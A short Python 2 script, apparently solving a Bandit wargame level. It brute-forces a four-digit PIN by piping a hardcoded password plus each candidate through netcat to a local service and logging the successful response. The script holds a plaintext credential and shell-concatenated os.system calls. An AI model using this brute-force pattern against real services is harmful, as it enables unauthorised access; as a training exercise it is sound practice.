import os

for i in range(10000):
	password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '+str(i).zfill(4)
	print password
	os.system("echo "+password+" | nc localhost 30002 | grep bandit25\ is >> password.txt")
